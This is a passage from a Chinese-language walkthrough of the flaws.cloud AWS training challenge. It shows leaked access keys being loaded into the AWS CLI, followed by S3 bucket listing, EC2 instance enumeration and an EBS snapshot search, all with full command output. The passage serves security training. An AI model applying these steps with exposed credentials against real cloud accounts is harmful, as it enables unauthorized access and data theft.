用获得的`access_keys`配置AWS CLI：
    ~/testtest$ aws configure --profile flaws
    AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
    AWS Secret Access Key [None]: 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
    Default region name [None]: us-west-2
    Default output format [None]:
用这个账户权限看看S3存储桶中有什么有意思的内容：
    ~$ aws s3 ls --profile flaws
    2017-02-19 03:41:52 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
    2017-05-30 00:34:53 config-bucket-975426262029
    2018-07-08 00:09:49 flaws-logs
    2017-02-19 03:40:54 flaws.cloud
    2017-02-24 13:15:42 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
    2017-02-27 02:29:03 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
    2017-02-27 02:49:31 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
    2017-02-27 03:49:03 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
    2017-02-27 03:48:40 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
    2017-02-27 04:07:13 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
成功通关level 3，并找到level 4的入口。
## 0x04 Level 1-3 小结
至此，涉及到S3存储桶的挑战（level 1-3）已经全部通关，这里进行一个小结：
在AWS中，可以在S3存桶中可以配置各种权限的功能，包括用来托管静态网站。如果使用了过于宽松的权限，比如将访问权限设置为`Everyone`，就有可能像访问Web服务器目录列表一样访问S3存储桶的列表，就可能造成信息泄露。hackone平台上的几个类似的漏洞报告，包括针对Shopify、Udemy等厂家的S3文件目录暴露，读写S3的权限等：
， ，
， 。
如果出现的了将访问权限错误的这是为`Any Authenticated AWS
User`，即任何身份认证的AWS用户，而错误的认为这只是对自己的其他用户开放，依然会造成一个跨权限的访问。这里给出hackerone平台上针对Shopify的一个漏洞报告进行参考：
。
AWS秘钥泄露时常出现，这里提供一篇关于Instagram的百万美元的漏洞文章进行学习——Instagram’s Million Dollar
Bug：
。这篇文章中，安全研究员发现了一系列缺陷，包括一个S3桶，其中包含.tar.gz存档的各种修订文件，而其中一个档案包含了`AWS
credentials`，使得研究人员访问所Instagram所有的S3存储桶。
## 0x05 Level 4
> For the next level, you need to get access to the web page running on an EC2
> at
> [4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/)
>
> It’ll be useful to know that a snapshot was made of that EC2 shortly after
> nginx was setup on it.
我们的目标是进入`4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`，直接用浏览器打开，提示需要账号密码：
在level 4 挑战的描述中，我们知道，当nginx在EC2上部署后，会创建一个快照（EBS snapshot）。由这一思路出发，利用level
3中取得的账户查询flaws上运行的EC2实例的信息:
    ~$ aws ec2 describe-instances --profile flaws
    {
        "Reservations": [
            {
                "Instances": [
                    {
                        "Monitoring": {
                            "State": "disabled"
                        },
                        "PublicDnsName": "ec2-35-165-182-7.us-west-2.compute.amazonaws.com",
                        "StateReason": {
                            "Message": "",
                            "Code": ""
                        },
                        "State": {
                            "Code": 16,
                            "Name": "running"
                        },
                        "EbsOptimized": false,
                        "LaunchTime": "2017-02-12T22:29:24.000Z",
                        "PublicIpAddress": "35.165.182.7",
                        "PrivateIpAddress": "172.31.41.84",
                        "ProductCodes": [],
                        "VpcId": "vpc-1052ce77",
                        "CpuOptions": {
                            "CoreCount": 1,
                            "ThreadsPerCore": 1
                        },
                        "StateTransitionReason": "",
                        "InstanceId": "i-05bef8a081f307783",
                        "ImageId": "ami-7c803d1c",
                        "PrivateDnsName": "ip-172-31-41-84.us-west-2.compute.internal",
                        "KeyName": "Default",
                        "SecurityGroups": [
                            {
                                "GroupName": "launch-wizard-1",
                                "GroupId": "sg-490f6631"
                            }
                        ],
                        "ClientToken": "kTOiC1486938563883",
                        "SubnetId": "subnet-d962aa90",
                        "InstanceType": "t2.micro",
                        "CapacityReservationSpecification": {
                            "CapacityReservationPreference": "open"
                        },
                        "NetworkInterfaces": [
                            {
                                "Status": "in-use",
                                "MacAddress": "06:b0:7a:92:21:cf",
                                "SourceDestCheck": true,
                                "VpcId": "vpc-1052ce77",
                                "Description": "",
                                "NetworkInterfaceId": "eni-c26ed780",
                                "PrivateIpAddresses": [
                                    {
                                        "PrivateDnsName": "ip-172-31-41-84.us-west-2.compute.internal",
                                        "PrivateIpAddress": "172.31.41.84",
                                        "Primary": true,
                                        "Association": {
                                            "PublicIp": "35.165.182.7",
                                            "PublicDnsName": "ec2-35-165-182-7.us-west-2.compute.amazonaws.com",
                                            "IpOwnerId": "amazon"
                                        }
                                    }
                                ],
                                "PrivateDnsName": "ip-172-31-41-84.us-west-2.compute.internal",
                                "InterfaceType": "interface",
                                "Attachment": {
                                    "Status": "attached",
                                    "DeviceIndex": 0,
                                    "DeleteOnTermination": true,
                                    "AttachmentId": "eni-attach-a4901fc2",
                                    "AttachTime": "2017-02-12T22:29:24.000Z"
                                },
                                "Groups": [
                                    {
                                        "GroupName": "launch-wizard-1",
                                        "GroupId": "sg-490f6631"
                                    }
                                ],
                                "Ipv6Addresses": [],
                                "OwnerId": "975426262029",
                                "PrivateIpAddress": "172.31.41.84",
                                "SubnetId": "subnet-d962aa90",
                                "Association": {
                                    "PublicIp": "35.165.182.7",
                                    "PublicDnsName": "ec2-35-165-182-7.us-west-2.compute.amazonaws.com",
                                    "IpOwnerId": "amazon"
                                }
                            }
                        ],
                        "SourceDestCheck": true,
                        "Placement": {
                            "Tenancy": "default",
                            "GroupName": "",
                            "AvailabilityZone": "us-west-2a"
                        },
                        "Hypervisor": "xen",
                        "BlockDeviceMappings": [
                            {
                                "DeviceName": "/dev/sda1",
                                "Ebs": {
                                    "Status": "attached",
                                    "DeleteOnTermination": true,
                                    "VolumeId": "vol-04f1c039bc13ea950",
                                    "AttachTime": "2017-02-12T22:29:25.000Z"
                                }
                            }
                        ],
                        "Architecture": "x86_64",
                        "RootDeviceType": "ebs",
                        "IamInstanceProfile": {
                            "Id": "AIPAIK7LV6U6UXJXQQR3Q",
                            "Arn": "arn:aws:iam::975426262029:instance-profile/flaws"
                        },
                        "RootDeviceName": "/dev/sda1",
                        "VirtualizationType": "hvm",
                        "HibernationOptions": {
                            "Configured": false
                        },
                        "MetadataOptions": {
                            "State": "applied",
                            "HttpEndpoint": "enabled",
                            "HttpTokens": "optional",
                            "HttpPutResponseHopLimit": 1
                        },
                        "AmiLaunchIndex": 0
                    }
                ],
                "ReservationId": "r-0fe151dbbe77e90cc",
                "Groups": [],
                "OwnerId": "975426262029"
            }
        ]
    }
在返回的信息中，在`EBS`中找到`VolumeId`，在`Association`中找到公有IP
也就是说，有一个EC2实例在运行，它的`VolumeId`为`vol-04f1c039bc13ea950`，IP地址为`35.165.182.7`。
为了确认这一发现，利用`nslookup`工具对level 4中的EC2地址进行解析，发现IP对应一致：
那么，下一步要做到的就是通过`VolumeId`寻找EBS快照，看看能不能发现有用的信息：
    ~$ aws ec2 describe-snapshots --filters "Name=volume-id, Values=vol-04f1c039bc13ea950" --profile flaws
    {
        "Snapshots": [
            {
                "Description": "",
                "Tags": [
                    {
                        "Value": "flaws backup 2017.02.27",
                        "Key": "Name"
                    }
                ],
                "Encrypted": false,
                "VolumeId": "vol-04f1c039bc13ea950",
                "State": "completed",
                "VolumeSize": 8,
                "StartTime": "2017-02-28T01:35:12.000Z",